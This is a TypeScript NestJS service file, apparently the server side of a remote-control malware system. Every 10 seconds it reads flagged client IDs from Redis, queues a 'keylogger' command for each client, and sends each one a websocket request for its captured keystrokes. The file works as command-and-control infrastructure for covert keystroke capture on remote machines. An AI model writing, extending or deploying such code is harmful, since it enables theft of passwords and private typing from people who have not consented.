import { RedisRepository } from "@/src/repository/redis/domain/redis.repository";
import { Injectable, OnModuleInit } from "@nestjs/common";
import { Cron, Interval } from "@nestjs/schedule";
import { WsClientSendKeylogger } from "../../ws-client/application/events/ws-client-send-keylogger";

@Injectable()
export class KeyLoggerRepository implements OnModuleInit {
  constructor(
    private readonly redisRepository: RedisRepository,
    private readonly wsClientSendKeylogger: WsClientSendKeylogger,
  ) { }

  onModuleInit() {
    this.redisRepository.HDELALL(["keylogger"]);
  }

  @Interval(10000)
  async getKeys() {
    const values = await this.redisRepository.HGETALL<Record<string, boolean>>([
      "keylogger",
    ]);

    if (Object.keys(values || {}).length > 0) console.log("values", values);

    for (const [clientid, value] of Object.entries(values || {})) {
      const redisData = await this.redisRepository.HGET(
        ["client-commands-requests"],
        clientid,
      );
      let clientCommands = redisData ? JSON.parse(redisData) : [];

      clientCommands.push("keylogger");

      await this.redisRepository.HSET(["client-commands-requests"], {
        [clientid]: JSON.stringify(clientCommands),
      });
      // console.log("clientid", clientid, value);
      await this.wsClientSendKeylogger.sendGetKeyloggerKeys(clientid);
    }
  }
}
